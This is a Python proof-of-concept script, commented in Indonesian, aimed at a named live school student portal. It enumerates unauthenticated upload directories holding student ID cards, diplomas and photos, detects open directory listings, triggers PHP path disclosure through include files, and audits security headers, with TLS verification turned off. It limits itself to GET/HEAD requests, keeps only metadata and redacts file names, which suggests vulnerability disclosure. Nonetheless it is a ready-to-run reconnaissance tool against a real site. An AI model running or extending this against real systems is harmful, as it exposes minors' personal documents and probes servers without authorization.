#!/usr/bin/env python3
"""
PoC — SISWA MGKB (pcmgkb.my.id/siswamugeb): informasi & PII tanpa autentikasi.

Membuktikan, tanpa login:
  F1  Direktori unduhan siswa (files_ktp / files_ijazah / files_fotosiswa)
      dapat dienumerasi dan berkasnya diunduh (HTTP 200) — KTP, ijazah,
      kartu NISN, foto siswa.
  F2  Directory listing (autoindex) aktif pada include/ files/ images/ styles/.
  F3  include/*.php diakses langsung -> fatal error PHP + path absolut server.

Non-destruktif: hanya GET/HEAD. Isi berkas PII TIDAK disimpan; hanya
metadata (status, ukuran, tipe). Nama berkas diredact pada keluaran.

Pemakaian:
  python3 poc_siswamugeb_exposure.py
  python3 poc_siswamugeb_exposure.py --base-url https://pcmgkb.my.id/siswamugeb
  python3 poc_siswamugeb_exposure.py --out evidence.txt --json evidence.json
  python3 poc_siswamugeb_exposure.py --file urls.txt   # daftar URL tambahan untuk dicek
"""

import argparse
import json
import re
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request

DEFAULT_BASE = "https://pcmgkb.my.id/siswamugeb"
UA = "Mozilla/5.0 (X11; Linux x86_64) PoC-siswamugeb/1.0"

# Direktori upload yang menyimpan dokumen siswa (PII).
PII_DIRS = ["files/files_ktp", "files/files_ijazah", "files/files_fotosiswa", "files/files_barang"]
LIST_DIRS = ["files/", "include/", "images/", "styles/"] + [d + "/" for d in PII_DIRS]
# Berkas include yang membocorkan path absolut bila diakses langsung.
INCLUDE_PROBES = [
    "include/appsettings.php",
    "include/commonfunctions.php",
    "include/belum_input_pembiasaan_settings.php",
]
FILE_RE = re.compile(r'href="([^"?][^"]*\.(?:jpg|jpeg|png|pdf|webp|gif|bmp|svg|doc|docx|xls|xlsx|zip))"', re.I)
FILE_EXT = re.compile(r"\.(?:jpg|jpeg|png|pdf|webp|gif|bmp|svg|doc|docx|xls|xlsx|zip)$", re.I)
PATH_LEAK_RE = re.compile(r"(/[A-Za-z0-9_./-]*(?:public_html|home\d*)[A-Za-z0-9_./-]*)")
SEC_HEADERS = [
    "x-frame-options",
    "content-security-policy",
    "strict-transport-security",
    "x-content-type-options",
    "referrer-policy",
    "permissions-policy",
]

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def fetch(url, method="GET", max_bytes=200_000):
    req = urllib.request.Request(url, method=method, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=25, context=CTX) as r:
            body = b""
            if method != "HEAD":
                body = r.read(max_bytes)
            return r.status, dict(r.headers), body
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), b""
    except Exception as e:  # noqa: BLE001
        return 0, {"x-error": str(e)}, b""


def redact(name):
    """Sembunyikan identitas pada nama berkas: sisakan pola non-nama."""
    base = name.rsplit("/", 1)[-1]
    if not base or len(base) < 6:
        return "<redacted>"
    return base[:3] + "…" + base[-6:]


def main():
    ap = argparse.ArgumentParser(description="PoC SISWA MGKB unauth exposure")
    ap.add_argument("--base-url", default=DEFAULT_BASE)
    ap.add_argument("--out", help="simpan ringkasan teks ke berkas")
    ap.add_argument("--json", help="simpan hasil JSON ke berkas")
    ap.add_argument("--file", help="berkas berisi URL tambahan (satu per baris) untuk dicek statusnya")
    ap.add_argument("--max-files", type=int, default=25, help="maks berkas PII dicek per direktori")
    args = ap.parse_args()
    base = args.base_url.rstrip("/")

    result = {"base_url": base, "directory_listing": [], "pii_directories": [], "path_disclosure": [], "security_headers": {}, "extra_urls": []}
    lines = [f"# PoC SISWA MGKB — unauth exposure", f"# base: {base}", ""]

    # F2 — directory listing
    lines.append("## F2 — Directory listing (autoindex)")
    for d in LIST_DIRS:
        st, _h, body = fetch(base + "/" + d)
        text = body.decode("utf-8", "replace")
        listing = "Index of" in text
        files = FILE_RE.findall(text)
        result["directory_listing"].append({"dir": d, "status": st, "listing": listing, "files": len(files)})
        lines.append(f"  [{'LISTING' if listing else 'no-listing'}] {d}  status={st}  files={len(files)}")
    lines.append("")

    # F1 — PII directories downloadable without auth
    lines.append("## F1 — Unduhan PII tanpa autentikasi (KTP / ijazah / foto)")
    for d in PII_DIRS:
        st, _h, body = fetch(base + "/" + d + "/")
        text = body.decode("utf-8", "replace")
        raw = FILE_RE.findall(text)
        files = [urllib.parse.unquote(x.rsplit("/", 1)[-1]) for x in raw]
        entry = {"dir": d, "status": st, "count": len(files), "samples": []}
        for f in files[: args.max_files]:
            fu = f"{base}/{d}/{urllib.parse.quote(f)}"
            s, h, _b = fetch(fu, method="HEAD")
            ct = h.get("Content-Type", "")
            size = h.get("Content-Length", "?")
            entry["samples"].append({"file": redact(f), "status": s, "type": ct, "bytes": size})
            lines.append(f"  [{s}] {d}/{redact(f)}  type={ct}  bytes={size}")
        result["pii_directories"].append(entry)
    lines.append("")

    # F3 — path disclosure via direct include access
    lines.append("## F3 — Akses langsung include/*.php -> path absolut + error PHP")
    for p in INCLUDE_PROBES:
        st, _h, body = fetch(base + "/" + p)
        text = body.decode("utf-8", "replace")
        m = PATH_LEAK_RE.search(text)
        leak = m.group(1) if m else None
        has_err = ("Fatal error" in text) or ("Uncaught" in text)
        result["path_disclosure"].append({"path": p, "status": st, "php_error": has_err, "abs_path": leak})
        lines.append(f"  [{st}] {p}  php_error={has_err}  abs_path={leak}")
    lines.append("")

    # Header keamanan
    lines.append("## Header keamanan (login.php)")
    st, h, _b = fetch(base + "/login.php")
    for name in SEC_HEADERS:
        val = h.get(name) or h.get(name.title())
        present = bool(val)
        result["security_headers"][name] = val or "<absent>"
        lines.append(f"  {'OK  ' if present else 'MISS'} {name}: {val}")
    lines.append("")

    # URL tambahan (opsional, mis. daftar temuan spesifik)
    if args.file:
        lines.append("## URL tambahan")
        with open(args.file, encoding="utf-8") as fh:
            for u in (x.strip() for x in fh):
                if not u or u.startswith("#"):
                    continue
                s, hh, _b = fetch(u, method="HEAD")
                result["extra_urls"].append({"url": u, "status": s, "type": hh.get("Content-Type", "")})
                lines.append(f"  [{s}] {u}  type={hh.get('Content-Type', '')}")
        lines.append("")

    out = "\n".join(lines)
    print(out)
    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            fh.write(out + "\n")
    if args.json:
        with open(args.json, "w", encoding="utf-8") as fh:
            json.dump(result, fh, indent=2, ensure_ascii=False)
    return 0


if __name__ == "__main__":
    sys.exit(main())
